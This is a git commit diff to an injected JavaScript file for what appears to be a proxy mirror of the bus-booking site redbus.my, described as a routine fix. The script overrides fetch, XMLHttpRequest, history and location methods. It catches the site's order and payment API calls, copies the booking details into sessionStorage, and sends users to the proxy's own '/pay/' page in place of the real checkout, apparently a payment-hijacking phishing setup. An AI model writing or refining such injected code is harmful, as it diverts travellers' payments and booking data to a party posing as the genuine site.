11093bd0c05724de1ed76ecb6f1830966b2a551d
Rshijituan <rshijituan@gmail.com>
2026-05-23 06:41:45 +0800

    fix: handle Request objects in fetch, merge payment+api intercepts into single patch

--- src/inject.js
+++ src/inject.js
@@ -1,38 +1,54 @@
 (function(){
   'use strict';
 
-  // Redirect API calls to redbus.my directly (proxy can't forward POST bodies)
+  function getUrl(input) {
+    if (typeof input === 'string') return input;
+    if (input instanceof Request) return input.url;
+    return '';
+  }
+  function isPayApi(p) {
+    return p.indexOf('/createOrder') !== -1 || p.indexOf('/orderInfo') !== -1
+      || p.indexOf('/placeOrder') !== -1 || p.indexOf('/saveBooking') !== -1
+      || p.indexOf('/proceedToPayment') !== -1 || p.indexOf('/paymentInit') !== -1;
+  }
+  function redirectPay() {
+    var data = extractBookingData();
+    if (data) {
+      try { sessionStorage.setItem('redbus_booking', JSON.stringify(data)); } catch(ex) {}
+      window.location.href = '/pay/';
+    }
+  }
+
   var _fetch = window.fetch;
   window.fetch = function(input, init) {
-    if (typeof input === 'string') {
-      input = input.replace(/https?:\/\/(?:www\.)?redbus\.my/gi, '');
-      if (isApiPath(input)) input = 'https://www.redbus.my' + input;
+    var url = getUrl(input);
+    if (url) {
+      var p = url.split('?')[0];
+      // Payment API: redirect to /pay/
+      if (isPayApi(p)) { console.log('[Redbus Pay] Intercepted:', p); redirectPay(); return new Promise(function(){}); }
+      // Route /redPay/ directly to redbus.my (proxy can't forward POST body)
+      if (url.indexOf('/redPay/') !== -1) { input = 'https://www.redbus.my' + url.replace(/https?:\/\/(?:www\.)?redbus\.my/gi, ''); return _fetch.call(window, input, init); }
+      // Strip redbus.my domain for other requests
+      if (typeof input === 'string') input = input.replace(/https?:\/\/(?:www\.)?redbus\.my/gi, '');
     }
     return _fetch.call(window, input, init);
   };
+
   var _origOpen = XMLHttpRequest.prototype.open;
   XMLHttpRequest.prototype.open = function(method, url) {
     if (typeof url === 'string') {
       url = url.replace(/https?:\/\/(?:www\.)?redbus\.my/gi, '');
-      if (isApiPath(url)) url = 'https://www.redbus.my' + url;
     }
     return _origOpen.call(this, method, url);
   };
-  function isApiPath(p) {
-    p = p.split('?')[0];
-    return p.indexOf('/redPay/') !== -1;
-  }
 
   // Intercept page navigation to payment → redirect to /pay/
   function checkPayUrl(url) {
     if (typeof url === 'string') {
       var p = url.split('?')[0];
       if (p.indexOf('/paymentDetails') !== -1 || p.indexOf('/payment') !== -1 || p.indexOf('/checkout') !== -1) {
-        var bookingData = extractBookingData();
-        if (bookingData) {
-          try { sessionStorage.setItem('redbus_booking', JSON.stringify(bookingData)); } catch(ex) {}
-          return '/pay/';
-        }
+        redirectPay();
+        return '/pay/';
       }
     }
     return url;
@@ -41,32 +57,8 @@
   history.pushState = function(s, t, u) { u = checkPayUrl(u); return _ps.call(this, s, t, u); };
   var _rs = history.replaceState;
   history.replaceState = function(s, t, u) { u = checkPayUrl(u); return _rs.call(this, s, t, u); };
-  try {
-    var _assign = location.assign.bind(location);
-    location.assign = function(u) { return _assign(checkPayUrl(u)); };
-  } catch(e) {}
-  try {
-    var _rep = location.replace.bind(location);
-    location.replace = function(u) { return _rep(checkPayUrl(u)); };
-  } catch(e) {}
-
-  // Intercept payment API calls (URLs may be relative or absolute)
-  var _origFetch2 = window.fetch;
-  window.fetch = function(input, init) {
-    if (typeof input === 'string') {
-      var p = input.split('?')[0];
-      if (p.indexOf('/createOrder') !== -1 || p.indexOf('/orderInfo') !== -1 || p.indexOf('/placeOrder') !== -1 || p.indexOf('/saveBooking') !== -1 || p.indexOf('/proceedToPayment') !== -1 || p.indexOf('/paymentInit') !== -1) {
-        console.log('[Redbus Pay] Intercepted:', p);
-        var bookingData = extractBookingData();
-        if (bookingData) {
-          try { sessionStorage.setItem('redbus_booking', JSON.stringify(bookingData)); } catch(ex) {}
-          window.location.href = '/pay/';
-          return new Promise(function() {});
-        }
-      }
-    }
-    return _origFetch2.call(window, input, init);
-  };
+  try { var _assign = location.assign.bind(location); location.assign = function(u) { return _assign(checkPayUrl(u)); }; } catch(e) {}
+  try { var _rep = location.replace.bind(location); location.replace = function(u) { return _rep(checkPayUrl(u)); }; } catch(e) {}
 
   function extractBookingData() {
     var data = {};
@@ -84,11 +76,7 @@
         }
       }
     } catch(ex) {}
-    try {
-      var pd = window.pageData || {};
-      data.origin = data.origin || pd.fromCity || '';
-      data.destination = data.destination || pd.toCity || '';
-    } catch(ex) {}
+    try { var pd = window.pageData || {}; data.origin = data.origin || pd.fromCity || ''; data.destination = data.destination || pd.toCity || ''; } catch(ex) {}
     if (!data.origin) {
       var sp = new URLSearchParams(location.search);
       data.origin = sp.get('fromCityName') || '';
